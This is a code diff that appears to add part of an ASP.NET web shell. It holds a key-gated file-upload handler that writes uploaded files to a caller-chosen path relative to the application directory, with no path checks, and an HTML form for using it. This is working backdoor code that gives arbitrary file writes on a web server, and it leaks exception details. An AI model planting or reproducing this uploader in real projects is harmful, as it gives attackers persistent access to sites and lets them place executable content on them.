@@ -1,0 +1,58 @@
+    private string UploadFile()
+    {
+        try
+        {
+            if (Request.Params["authkey"] == null)
+            {
+                return string.Empty;
+            }
+
+            if (Request.Params["authkey"] != AUTHKEY)
+            {
+                return string.Empty;
+            }
+            
+            if (Request.Files.Count != 1)
+            {
+                return "No file selected";
+            }
+
+            HttpPostedFile httpPostedFile = Request.Files[0];
+
+            int fileLength = httpPostedFile.ContentLength;
+            byte[] buffer = new byte[fileLength];
+            httpPostedFile.InputStream.Read(buffer, 0, fileLength);
+
+            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
+			string path = Request.Params["path"]+ Path.GetFileName(httpPostedFile.FileName);
+            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, path), FileMode.Create))
+            {
+                fileStream.Write(buffer, 0, buffer.Length);
+            }
+
+            return "File uploaded";
+        }
+        catch (Exception ex)
+        {
+            return ex.ToString();
+        }
+    }
+
+    /// <summary>
+    /// 
+    /// </summary>
+    /// <returns></returns>
+    private string GetUploadControls()
+    {
+        string temp = string.Empty;
+
+        temp = "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
+        temp += "<br>Auth Key: <input type=\"text\" name=\"authKey\"><br>";
+		temp += "<br>Path: <input type=\"text\" name=\"path\"><br>";
+        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
+        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
+        temp += "</form>";
+
+        return temp;
+    }
+</script>
